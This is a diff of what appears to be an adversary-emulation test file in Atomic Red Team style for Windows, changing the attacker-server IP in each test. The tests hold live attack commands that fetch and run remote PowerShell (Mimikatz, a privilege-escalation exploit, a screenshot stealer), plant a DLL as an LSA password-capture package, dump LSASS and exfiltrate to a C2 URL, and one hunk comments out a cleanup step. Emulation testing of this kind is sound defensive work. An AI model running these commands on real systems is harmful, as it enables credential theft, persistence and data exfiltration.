@@ -43,9 +43,9 @@ atomic_tests:
     name: powershell
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (iwr "http://192.168.80.138:1234/Invoke-MalDoc.ps1" -UseBasicParsing)
+      IEX (iwr "http://192.168.80.128:1234/Invoke-MalDoc.ps1" -UseBasicParsing)
       $macroCode = Get-Content "#{macro_path}" -Raw
-      $URL = "http://192.168.80.138:1234"
+      $URL = "http://192.168.80.128:1234"
       $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
       Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
     cleanup_command: |
@@ -61,7 +61,7 @@ atomic_tests:
     url:
       description: URL to hosted sct file
       type: url
-      default: http://192.168.80.138:1234/RegSvr32.sct
+      default: http://192.168.80.128:1234/RegSvr32.sct
     regsvr32path:
       description: Default location of Regsvr32.exe
       type: path
@@ -130,7 +130,7 @@ atomic_tests:
     hta_url:
       description: URL to HTA file for execution
       type: string
-      default: http://192.168.80.138:1234/T1218.005.hta
+      default: http://192.168.80.128:1234/T1218.005.hta
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -150,7 +150,7 @@ atomic_tests:
   executor:
     command: |
       whoami
-      IEX ((new-object net.webclient).downloadstring('http://192.168.80.138:1234/MS16-135.ps1'))
+      IEX ((new-object net.webclient).downloadstring('http://192.168.80.128:1234/MS16-135.ps1'))
       whoami
     name: powershell
 
@@ -289,7 +289,7 @@ atomic_tests:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
       type: url
-      default: http://192.168.80.138:1234/Invoke-Mimikatz.ps1
+      default: http://192.168.80.128:1234/Invoke-Mimikatz.ps1
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -336,7 +336,7 @@ atomic_tests:
   executor: 
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      ((new-object net.webclient).downloadstring('http://192.168.80.138:1234/Get-Screenshot.ps1'))|iex
+      ((new-object net.webclient).downloadstring('http://192.168.80.128:1234/Get-Screenshot.ps1'))|iex
       timeout 30
       Stop-Job -Name "Screenshot"
     name: powershell
@@ -360,7 +360,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/PasswordChange.dll','C:\Windows\System32\PasswordChange.dll')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/PasswordChange.dll','C:\Windows\System32\PasswordChange.dll')
     name: powershell
 # T1547
 - name: Add new Registry
@@ -372,7 +372,7 @@ atomic_tests:
     command: |
       REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
       REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0PasswordChange" /f
-      REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /f
+#      REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /f
     name: command_prompt
 
 # Step 7: Persistence Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
@@ -384,7 +384,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/syscheck.vbs','C:\Windows\System32\syscheck.vbs')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/syscheck.vbs','C:\Windows\System32\syscheck.vbs')
     name: powershell
     elevation_required: true
 # T1547.001
@@ -421,7 +421,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/procdump.exe','C:\Windows\kb-10233.exe')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/procdump.exe','C:\Windows\kb-10233.exe')
     name: powershell
 # T1003.001
 - name: Dump LSASS.exe Memory using ProcDump
@@ -451,7 +451,7 @@ atomic_tests:
     destination_url:
       description: Destination URL to post encoded data.
       type: string
-      default: 192.168.80.138:9000
+      default: 192.168.80.128:8000
     filepath:
       description: The file which is being exfiltrated to the C2 Server.
       type: path
